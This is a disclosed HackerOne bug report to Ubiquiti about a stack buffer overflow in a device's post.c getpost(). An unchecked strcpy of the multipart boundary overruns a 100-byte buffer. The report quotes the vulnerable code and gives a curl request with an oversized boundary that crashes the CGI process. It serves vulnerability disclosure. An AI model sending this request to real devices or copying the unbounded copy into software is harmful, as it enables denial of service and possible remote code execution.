@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/74004
+WeaknessName:Memory Corruption - Generic
+Reporter:https://hackerone.com/93c08539
+ReportedTo:Ubiquiti Networks(ubnt)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:07.04.2016 21:59:06
+
+Summary:
+
+tldr: Just like happen in Report [73491](https://hackerone.com/reports/73491), but **MUCH WORSE**.
+
+#The Vulnerability
+After the Report [73491](https://hackerone.com/reports/73491), I decided to take another look in the code on  files`post.c` and `uploadbuffer.c` (once I have nothing better to do than watch F1).
+
+The problematic code:
+```
+char *getpost(void) {
+/* Some Code */
+	char *mb;
+	char boundary[100];
+
+/* Some Code */
+	if(!strncasecmp(buf,"multipart/form-data",19)) {
+		file_upload=1;
+		mb = strchr(buf,'=');
+		if(mb) strcpy(boundary,mb+1);	//!!The problematic Line!!
+		else {
+			Error("File Upload Error: No MIME boundary found"); 
+			/* Some Code */
+			return(NULL);
+		}
+	}
+/* Rest of the Code */
+}
+```
+Has you can see, it's copied the string in `mb+1` to `boundary` ( witch have a fixed size), so will cause a **Buffer Overflow** if the string in `mb` (here represent `boundary` camp in a POST request) it's bigger than 100 bytes. In a **Buffer Overflow** which happen in stack memory, do a remote code execution should be easy (Even more on a AirMax, once the equipment are almost identical).
+
+#Reproduce
+I will not create a exploit to this report, but unlike the Report [73491](https://hackerone.com/reports/73491), you just have to ask for one.
+
+This Curl command will cause a buffer overflow.
+```
+curl -X POST -H "Content-Type: multipart/form-data; boundary=----------------------------dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd" --data-binary AnyDataHERE "https://192.168.1.20/login.cgi" -k -v
+```
+Obs: Some times you need a bigger `boundary` (more `d`!!).
+
+The lighttpd will return `(mod_cgi.c.1319) cleaning up CGI: process died with signal 11`.
